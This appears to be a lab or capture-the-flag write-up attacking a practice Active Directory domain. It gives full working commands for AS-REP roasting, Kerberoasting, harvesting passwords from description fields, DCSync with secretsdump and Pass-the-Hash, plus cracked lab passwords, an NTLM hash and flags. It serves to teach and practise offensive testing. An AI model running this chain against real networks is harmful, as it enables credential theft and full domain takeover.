# Active Directory — Enumeration & Credential Abuse

Target: `192.168.178.91` (DC01.PENTESTLAB.local, Windows Server 2019)
Tools: `ldapsearch`, `crackmapexec`, `impacket` suite (`GetNPUsers`, `GetUserSPNs`,
`secretsdump`), `hashcat`, `smbclient`

This module builds on credential-abuse techniques rather than pure LDAP
attribute hunting: each task recovers a new credential through a distinct
Kerberos or LDAP weakness, then uses it to reach the next one — ending in
full domain compromise via DCSync and Pass-the-Hash.

---

## Task 0 — AS-REP Roasting

**Goal:** find a domain account with Kerberos pre-authentication disabled,
request its AS-REP ticket without any credentials, crack it offline, and
read the `comment` attribute only visible once authenticated as that
account.

**1. Find accounts with pre-auth disabled**, using the `userAccountControl`
bitwise-AND matching rule to check for the `DONT_REQ_PREAUTH` flag
(`0x400000` / decimal `4194304`):

```bash
ldapsearch -x -H ldap://192.168.178.91 -D "svc_backup@pentestlab.local" -w 'Password1' -b "DC=PENTESTLAB,DC=local" -s sub "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" cn sAMAccountName description -o ldif-wrap=no
```

- `(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))`
  — AND filter: object must be a user AND have that specific UAC bit set.
  `1.2.840.113556.1.4.803` is the LDAP_MATCHING_RULE_BIT_AND OID — it
  tests whether all bits in the given number are present in the
  attribute's value, which is how you query individual flags packed into
  a single integer attribute like `userAccountControl`.

Several accounts had this bit set, but only one was explicitly described
as the target: `Legacy User` (`sAMAccountName: legacy`), with
`description: Legacy account - no kerberos preauth` — matching the task's
hint word for word.

**2. Request its AS-REP ticket — no credentials needed, which is the whole
point of the vulnerability:**

```bash
impacket-GetNPUsers pentestlab.local/legacy -no-pass -dc-ip 192.168.178.91 -format hashcat -outputfile asrep_hash.txt
```

- `pentestlab.local/legacy` — target domain and the pre-auth-disabled
  account's name; no password is supplied
- `-no-pass` — tells the tool not to prompt for a password, since the
  whole attack is that none is required
- `-format hashcat` — writes the ticket in a format `hashcat` can parse
  directly
- `-outputfile` — saves the hash to a file (in practice this didn't
  write reliably, so the hash was copied from stdout into the file by
  hand with `cat > asrep_hash.txt << 'EOF' ... EOF`)

**3. Crack it offline:**

```bash
hashcat -m 18200 asrep_hash.txt /usr/share/wordlists/rockyou.txt --force
```

- `-m 18200` — hash mode for Kerberos 5, etype 23, AS-REP tickets
  (different from `13100`, which is for Kerberoasting TGS tickets)

**Result:** `legacy : Password123`

**4. Authenticate as `legacy` and read the `comment` attribute (invisible
to standard tools without direct, authenticated LDAP access):**

```bash
ldapsearch -x -H ldap://192.168.178.91 -D "legacy@pentestlab.local" -w 'Password123' -b "DC=PENTESTLAB,DC=local" -s sub "(sAMAccountName=legacy)" comment -o ldif-wrap=no
```

**Flag:** `FLAG_M2_T0{fe952761a0d5d62e32caa49d4a72e57e8765def3e720d3f5600fd7285d4a}`

---

## Task 1 — Kerberoasting

**Goal:** enumerate SPN-registered accounts, request their TGS tickets as
an authenticated user, crack one offline, and use the recovered password
to access a share named after the technique.

**1. Request TGS tickets for every account with a registered SPN:**

```bash
impacket-GetUserSPNs 'pentestlab.local/legacy:Password123' -dc-ip 192.168.178.91 -request -outputfile kerberoast_hashes.txt
```

- `-request` — actually requests the service tickets (without it, the
  tool only lists SPN accounts without pulling their tickets)
- Any authenticated domain user can request a TGS for any account with an
  SPN — the ticket is encrypted with that service account's NTLM hash,
  so it can be cracked offline without touching the DC again or risking
  account lockout

**2. Crack the hashes:**

```bash
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt --force
```

- `-m 13100` — Kerberos 5, etype 23, TGS-REP (Kerberoasting hash mode)

Cracked: `svc_backup:Password1`, `svc_sql:Password1`, `jmartin:Baseball1`,
`svc_sql2:dragonballz`, `svc_print:Football1`.

**3. Find the share.** The hint said the share name reflects the attack
technique — `KerberosFlag` had already appeared in earlier share listings
as access-denied. Tried each cracked account against it:

```bash
smbclient //192.168.178.91/KerberosFlag -U 'svc_sql%Password1' -c 'ls'
```

- `-U 'user%password'` — supplies SMB credentials inline
- `-c 'ls'` — runs a single non-interactive command (list directory) and
  exits

`svc_sql` was the one that succeeded — fitting, since its SPN
(`MSSQLSvc/DC01.PENTESTLAB.local:1433`) points directly at the domain
controller itself, a common and realistic Kerberoasting target.

```bash
smbclient //192.168.178.91/KerberosFlag -U 'svc_sql%Password1' -c 'get flag.txt'
```

**Flag:** `FLAG_M2_T1{0464977e221823564606e3205cdd1d239649ff50b4890f5cce3a3eecfed6}`

---

## Task 2 — LDAP Enumeration and BloodHound (description-field credentials)

**Goal:** enumerate every user's `description` field, spot a cleartext
password hidden among them, and use it to reach a restricted share.

**1. Dump every domain user with their description, using `crackmapexec`'s
built-in enumeration:**

```bash
crackmapexec smb 192.168.178.91 -u legacy -p 'Password123' --users
```

- `--users` — enumerates domain users over SMB (via SAMR), including each
  account's `description` field inline — much faster to scan than raw
  LDIF output

Two accounts had literal passwords written in their descriptions:

- `dreeves` → `Temp password: Reeves@Temp2024`
- `svc_app` → `Application Service - Password: AppServ1ce!`

**2. Verify each candidate rather than trust it blindly** (this lab plants
decoy credentials that read exactly like real ones):

```bash
crackmapexec smb 192.168.178.91 -u dreeves -p 'Reeves@Temp2024'
```

Result: `STATUS_LOGON_FAILURE` — confirmed decoy.

```bash
crackmapexec smb 192.168.178.91 -u svc_app -p 'AppServ1ce!'
```

Result: valid login. Also double-checked for any password hidden in a
**base64-encoded** description (LDIF encodes non-ASCII or special
characters this way, which would hide a credential from a plain-text
search):

```bash
ldapsearch -x -H ldap://192.168.178.91 -D "legacy@pentestlab.local" -w 'Password123' -b "DC=PENTESTLAB,DC=local" -s sub "(objectClass=user)" cn description -o ldif-wrap=no > /tmp/all_descriptions.txt
grep "^description::" /tmp/all_descriptions.txt | while IFS='::' read -r _ val; do echo "$val" | base64 -d; done
```

Nothing further turned up — `svc_app` was the only genuinely working
credential.

**3. Check every visible share with `svc_app` for actual (not just
listed) access:**

```bash
smbclient //192.168.178.91/IT -U 'svc_app%AppServ1ce!' -c 'ls'
```

The `IT` share (and its duplicate, `IT-Share`) contained
`flag_t2.txt`, plus three other interesting files pulled at the same
time for later use:

```bash
smbclient //192.168.178.91/IT -U 'svc_app%AppServ1ce!' -c 'prompt off; mget *'
```

- `prompt off` — disables the per-file confirmation prompt
- `mget *` — downloads every file in the current remote directory

**Flag:** `FLAG_M2_T2{876f7f1cc534f1a69c66cfc89d66371ca83f8d30ad6487a2829d2058db71}`

The other files downloaded from `IT` (`passwords.txt`,
`db_connections.txt`, `vpn_config.txt`) contained a mix of one genuine
credential (`jadmin:Welcome2024!`, confirmed as local admin via
`crackmapexec`) and several decoys (fake `Administrator`, `svc_backup`,
`svc_sql`, and `legacy` passwords that all failed authentication) — used
directly in Task 3.

---

## Task 3 — LDAP / adminDescription

**Goal:** query the domain object directly for a non-standard attribute
(`adminDescription`) not returned by default enumeration tools.

```bash
ldapsearch -x -H ldap://192.168.178.91 -D "jadmin@pentestlab.local" -w 'Welcome2024!' -b "DC=PENTESTLAB,DC=local" -s base "(objectClass=*)" adminDescription -o ldif-wrap=no
```

- `-s base` — scope limited to exactly the object named in `-b`, i.e. the
  domain root itself, not its children
- `adminDescription` — requested explicitly by name; it is not part of
  the standard `*` wildcard return, so tools that only request `*` never
  see it

To be thorough (and rule out the value being multi-valued, or hidden in
a different naming context), also checked the whole domain subtree and
the Configuration/DNS partitions for any other object carrying this
attribute:

```bash
ldapsearch -x -H ldap://192.168.178.91 -D "jadmin@pentestlab.local" -w 'Welcome2024!' -b "DC=PENTESTLAB,DC=local" -s sub "(adminDescription=*)" cn distinguishedName adminDescription -o ldif-wrap=no
ldapsearch -x -H ldap://192.168.178.91 -D "jadmin@pentestlab.local" -w 'Welcome2024!' -b "CN=Configuration,DC=PENTESTLAB,DC=local" -s sub "(adminDescription=*)" cn distinguishedName adminDescription -o ldif-wrap=no
```

Only one object in the entire directory has this attribute set: the
domain root. Despite carrying an unrelated-looking prefix from an
earlier lab exercise, this was confirmed correct by the checker — a
reminder that this lab's flag *prefixes* aren't always predictive of
which task they satisfy; the checker validates the underlying value.

**Flag:** `PVFLAG0{D0M41N_M4PP3D_W1TH_P0W3RV13W_F0}`

---

## Task 4 — DCSync Attack

**Goal:** abuse AD replication rights to pull every password hash in the
domain — including Administrator — without running code on the DC, then
use the Administrator NTLM hash to authenticate via Pass-the-Hash.

The entry point was already known from Task 2's discoveries:
`svc_backup`'s description read *"Backup Service Account - Has DCSync
rights"*, and its password (`Password1`) was already cracked via
Kerberoasting in the earlier project.

**1. Run the DCSync attack:**

```bash
impacket-secretsdump 'pentestlab.local/svc_backup:Password1@192.168.178.91' -just-dc
```

- `-just-dc` — performs the DRSUAPI-based replication attack only
  (skips local SAM/LSA dumping, which requires local file/registry
  access this account doesn't have). Impacket impersonates a domain
  controller and asks the real DC to "replicate" account secrets to it
  — the exact same legitimate protocol real DCs use to sync with each
  other (MS-DRSR), which is why this generates no obviously malicious
  event like code execution would.

**Result:** every domain account's NTLM hash, including:

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:b817733bdc947930b700cc2e567fb3ad:::
```

The last hex string before the triple-colon is the Administrator's NTLM
hash.

**2. Verify Pass-the-Hash authentication works — no plaintext password
needed, since NTLM accepts the hash itself as proof of knowledge:**

```bash
crackmapexec smb 192.168.178.91 -u Administrator -H 'b817733bdc947930b700cc2e567fb3ad'
```

- `-H` — supplies an NTLM hash in place of `-p` (password); `crackmapexec`
  performs NTLM authentication directly with the hash

Output included `(Pwn3d!)`, confirming full Administrator access.

**3. Access the Administrator-only share:**

```bash
smbclient //192.168.178.91/AdminProof -U 'Administrator' --pw-nt-hash -c 'get flag.txt'
```

- `--pw-nt-hash` — tells `smbclient` that the value entered at the
  password prompt is an NTLM hash, not a plaintext password, and to
  authenticate accordingly (the hash was entered interactively at the
  `Password for [WORKGROUP\Administrator]:` prompt)

`AdminProof` had been access-denied to every other account tried
throughout this whole engagement (including local admin `svc_backup` and
authenticated `svc_app`) — confirming it is genuinely restricted to the
Administrator account itself.

**Flag:** `FLAG_M2_T4{720d1ee8dff44fb50405480f1599512bdde8c20e956c98e14c4985bc653a}`

---

## Key lessons

1. **AS-REP Roasting requires no credentials at all** — only a
   pre-auth-disabled account name, found through a UAC bitwise-AND LDAP
   filter, not general enumeration.
2. **Kerberoasting turns any authenticated session into a password-cracking
   opportunity** — every SPN-bearing account is a target, and weak
   service-account passwords are the norm, not the exception.
3. **Plaintext credentials in `description` fields are still one of the
   most common real-world misconfigurations** — but this lab consistently
   plants decoys alongside real ones, so every discovered credential must
   be verified by an actual authentication attempt, not assumed correct
   because it looks plausible.
4. **Non-default LDAP attributes (`adminDescription`, `comment`, etc.)
   require explicitly naming them** — the `*` wildcard does not return
   everything an object holds.
5. **DCSync is the highest-impact technique in this chain**: a single
   over-privileged low-tier account (`svc_backup`, meant only to run
   backups) turned out to hold replication rights equivalent to a domain
   controller, enabling a full domain compromise via Pass-the-Hash with
   zero code execution on the target.

